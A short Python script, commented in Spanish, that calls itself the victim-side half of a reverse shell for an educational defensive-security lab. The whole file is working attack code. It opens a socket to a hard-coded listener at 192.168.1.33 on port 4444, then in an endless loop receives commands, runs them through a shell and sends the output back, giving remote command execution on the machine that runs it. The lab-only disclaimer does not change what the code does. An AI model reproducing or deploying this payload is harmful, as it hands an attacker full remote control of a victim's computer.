#!/usr/bin/env python3
# =============================================================================
# REVERSE SHELL - LADO DE LA VÍCTIMA
# PROPÓSITO: Proyecto educativo de seguridad defensiva (Blue Team)
# ADVERTENCIA: Solo usar en laboratorio aislado propio
# COMPATIBILIDAD: Windows + Linux
# =============================================================================


#!/usr/bin/env python3
import socket, subprocess, sys 

def ejecutarComando(command):
    command_str = command.decode('utf-8', errors='ignore')
    return subprocess.check_output(command_str, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connection.connect(("192.168.1.33", 4444))  # ← ✅ IP CORRECTA (tu Manjaro)
connection.send(" \n [+]Conexion Exitosamente Establecida \n".encode('utf-8')) 

while True: 
    command = connection.recv(1024000)  # ← ✅ CAMBIADO DE 1024 A 1024000 (1 MB)
    try: 
        resultadosComando = ejecutarComando(command)
    except Exception as e:
        resultadosComando = str(e).encode('utf-8')
    connection.send(resultadosComando) 

connection.close()